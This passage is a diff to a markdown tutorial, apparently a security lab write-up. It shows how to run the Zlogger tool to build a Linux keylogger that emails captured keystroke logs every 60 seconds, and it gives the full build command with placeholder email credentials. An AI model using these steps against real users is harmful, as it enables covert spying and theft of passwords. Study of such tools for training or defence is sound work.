@@ -19,3 +19,7 @@ Let's familiarize ourselves with our new tool. Since Zlogger is a python based p
 >**NOTE:** *When testing, it seems that in my case '-i' or INTERVAL was required to avoid an error being thrown, despite the above image stating that interval is optional.*
 *It's strongly recommended before continuing to create an email account for the sole purpose of using this keylogger else you run the risk of flooding your email address with the logs Zlogger sends.*
 
+To get our keylogger file output to us, we must provide information to the tool. I typed 'python3 zlogger.py -i 60 -l -e [EMAILGOESHERE] -p [EMAILPASSWORDGOESHERE] -o ThisIsATest' and then hit enter. The -i flag indicates an interval of 60 seconds, which means every minute we will receive a new log file emailed to us. The -l flag tells Zlogger that we'd like the output file to be for Linux machines. The -e and -p flags should be for the emailaddress and password for the email address, while -o is the name of the output file. After hitting enter, this is what we're met with.
+
+![image](https://user-images.githubusercontent.com/46944661/117171177-43d72080-ad90-11eb-8ef1-a1aafa8ed6d3.png)
+
